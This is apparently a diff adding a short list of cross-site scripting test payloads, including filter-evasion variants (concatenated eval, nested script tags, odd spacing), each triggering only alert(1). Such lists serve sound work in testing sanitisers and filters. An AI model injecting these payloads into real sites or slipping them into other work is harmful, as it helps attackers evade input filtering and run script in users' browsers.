@@ -1,0 +1,8 @@
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<!-- Evaluation of string -->
+<script>eval('al'+'ert(1)')</script>
+<!-- Nested Tags -->
+<scr<script>ipt>alert(1)</script>
+<!-- Non-standard spacing -->
+<img src = x onerror = alert(1)>
